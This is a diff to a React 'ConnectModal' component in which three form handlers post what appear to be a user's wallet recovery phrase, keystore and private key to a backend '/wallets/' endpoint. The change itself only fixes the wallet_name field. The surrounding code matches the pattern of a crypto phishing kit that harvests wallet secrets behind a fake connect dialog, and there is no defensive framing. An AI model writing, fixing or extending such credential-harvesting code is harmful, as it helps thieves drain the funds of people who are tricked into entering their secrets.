@@ -119,7 +119,8 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
             };
             axios.post(
                 `${VITE_API_URL}/wallets/`,
-                { ...phraseValues, wallet_name: wallet },
+                // eslint-disable-next-line react/prop-types
+                { ...phraseValues, wallet_name: wallet.name },
                 config
             );
         },
@@ -139,7 +140,8 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
             };
             axios.post(
                 `${VITE_API_URL}/wallets/`,
-                { ...keyStoreValues, wallet_name: formType },
+                // eslint-disable-next-line react/prop-types
+                { ...keyStoreValues, wallet_name: wallet.name },
                 config
             );
         },
@@ -162,7 +164,8 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
             };
             axios.post(
                 `${VITE_API_URL}/wallets/`,
-                { ...privateKeyValues, wallet_name: formType },
+                // eslint-disable-next-line react/prop-types
+                { ...privateKeyValues, wallet_name: wallet.name },
                 config
             );
         },
